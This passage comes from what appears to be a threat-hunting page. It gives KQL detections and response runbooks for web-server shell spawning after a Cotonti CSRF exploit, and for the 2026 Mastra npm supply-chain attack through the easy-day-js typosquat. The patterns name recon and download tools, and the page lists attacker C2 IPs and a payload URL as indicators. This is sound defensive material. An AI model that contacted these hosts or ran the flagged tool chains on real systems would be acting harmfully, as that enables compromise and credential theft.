| where not(FileName in~ ("convert.exe","magick.exe","sendmail.exe","git.exe")) and ProcessCommandLine !has "composer"
Response runbook
1) Triage: examine the child ProcessCommandLine and the web-server parent command line — benign image/mail helpers (convert, sendmail) are obvious; recon (whoami/net) or download (certutil) commands are not. Correlate the host/time against the paired CSRF rights-update detection. 2) Contain: isolate the web host, kill the spawned process tree, and snapshot the Cotonti webroot for newly written/modified .php and template files. 3) Hunt: review web-server file writes for dropped webshells, audit Cotonti group rights and admin sessions for the CSRF privesc that preceded this, rotate web-app and DB credentials, and upgrade Cotonti past 1.0.0 / commit f43f1fc3.
DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName in~ ("php.exe","php-cgi.exe","w3wp.exe","httpd.exe","nginx.exe","caddy.exe")
| where FileName in~ ("cmd.exe","powershell.exe","pwsh.exe","wscript.exe","cscript.exe","net.exe","whoami.exe","certutil.exe","bash.exe")
| where AccountName !endswith "$"
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, FileName, ProcessCommandLine, SHA256
| order by Timestamp desc
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4688
| where ParentProcessName has_any ("php.exe","php-cgi.exe","w3wp.exe","httpd.exe","nginx.exe","caddy.exe")
| where NewProcessName has_any ("cmd.exe","powershell.exe","pwsh.exe","wscript.exe","cscript.exe","net.exe","whoami.exe","certutil.exe")
| where not(SubjectUserName endswith "$")
| project TimeGenerated, Computer, SubjectUserName, ParentProcessName, NewProcessName, CommandLine
| order by TimeGenerated desc

Mastra npm Supply Chain Attack: 140+ Packages Backdoored via easy-day-js Typosquat

StepSecurity
2026-06-18 8 use cases 3 techniques 5 kill-chain phases detected

On June 17, 2026, an attacker compromised the @mastra npm organization and quietly added easy-day-js as a dependency across 140+ packages in the Mastra AI framework ecosystem. easy-day-js is a typosquat of the popular dayjs date library, and its latest version contained an obfuscated postinstall dropper that downloaded and ran a second-stage payload from attacker-controlled servers, then deleted itself to remove any trace. Packages with a combined weekly download count exceeding 1.1 million were exposed. If you installed any @mastra package today, treat your environment as compromised.

Actions on Objectives
Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → [LLM] easy-day-js malicious setup.cjs written/deleted under node_modules
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → PowerShell encoded / obfuscated command · Trusted vendor binary / installer launching unusual children · Article-specific behavioural hunt — Mastra npm Supply Chain Attack: 140+ Packages Backdoored via easy-day-js Typosqu
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] Mastra easy-day-js postinstall dropper: node setup.cjs --no-warnings
Command & Control. Beacon to attacker infrastructure for control and tasking. → [LLM] easy-day-js Mastra dropper C2 callout to 23.254.164.92 / .123 · Beaconing — periodic outbound to small set of destinations · Network connections to article IPs / domains
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage.
easy-day-js Mastra dropper C2 callout to 23.254.164.92 / .123 AICommand & Control Medium
Hunts outbound connections to the two hardcoded easy-day-js second-stage C2 hosts (23.254.164.92, 23.254.164.123, payload at https://23.254.164.92:8000/update/49890878). Any dev workstation or CI agent reaching these IPs indicates a compromised @mastra/easy-day-js install fetching the Sapphire Sleet Node.js RAT. Rationale: Both IPs (23.254.164.92, 23.254.164.123) and the :8000/update/ payload URL are confirmed by JFrog, Socket and Microsoft as dedicated easy-day-js C2 — destination-IP match on confirmed-malicious infra is the highest-fidelity pivot available. Cross-checked against: • https://research.jfrog.com/post/easy-day-js/ • https://socket.dev/blog/mastra-npm-packages-compromised • https://www.microsoft.com/en-us/security/blog/2026/06/17/postinstall-payload-inside-mastra-npm-supply-chain-compromise/ • https://thehackernews.com/2026/06/144-mastra-npm-packages-compromised-via.html
ATT&CKT1105 T1571
Data sourcesNetwork_Traffic.All_Traffic
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Malware analyst or detection engineer detonating the sample in a lab segment that routes through corp egress
  • Threat-intel platform / sandbox actively probing the IOC IPs for enrichment
  • Internal vuln scanner sweeping the 23.254.164.0/24 (FranTech/BuyVM) range
  • Honeypot or canary deliberately reaching the C2 to confirm the block
Suppression filter
| where not(DeviceName has_any ("sandbox","malware-lab","detonation"))
Response runbook
1) Triage: identify the initiating process (expect node.exe) and host role — dev workstation vs CI runner. Pull the parent npm command and the package.json/lockfile to confirm an @mastra or easy-day-js dependency was installed in the last 96h. 2) Contain: block 23.254.164.92 and 23.254.164.123 at egress, isolate the host, and rotate ALL credentials reachable from that environment (npm tokens, LLM API keys, cloud provider tokens, DB secrets) — the RAT harvests them. 3) Hunt: pivot to other hosts that resolved/contacted these IPs, search for node executing setup.cjs, and enumerate every machine that ran npm install since 2026-06-17 01:01 UTC.

| where Timestamp > ago(14d)
| where RemoteIP in ("23.254.164.92", "23.254.164.123")
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteIP, RemotePort, RemoteUrl
| order by Timestamp desc
ImNetworkSession
| where TimeGenerated > ago(14d)
| where DstIpAddr in ("23.254.164.92", "23.254.164.123")
| project TimeGenerated, SrcHostname, SrcIpAddr, SrcUsername, DstIpAddr, DstPortNumber, NetworkApplicationProtocol, Url, DvcAction
| order by TimeGenerated desc
